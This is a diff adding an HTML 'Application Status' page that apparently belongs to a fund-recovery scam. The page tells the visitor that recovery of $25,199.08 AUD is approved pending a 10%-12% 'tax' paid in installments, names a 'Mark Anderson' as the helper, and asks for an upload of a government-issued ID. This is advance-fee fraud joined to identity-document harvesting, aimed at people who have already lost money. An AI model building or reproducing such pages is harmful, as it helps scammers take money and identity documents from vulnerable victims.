@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Status</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Your Application Status</h1>
+        <p>Your application for the recovery of $25,199.08 AUD in suspected fraudulent transactions has been submitted and verified. A confirmation will be sent to the Mark Anderson assisting you once the tax payment is completed.</p>
+        <p>Note: A 10%-12% recovery fee, classified as a tax on recovered funds, is required before the final transfer can be completed. This fee must be paid in at least two installments to ensure uninterrupted processing.</p>
+        <p>Thank you for your attention.</p>
+        
+        <form id="uploadForm">
+            <label for="idUpload">Please provide your government-issued ID card to verify your information.
+                :</label>
+            <input type="file" id="idUpload" accept="image/*,application/pdf" required>
+
+            <button type="button" onclick="goToNext()">Next</button>
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
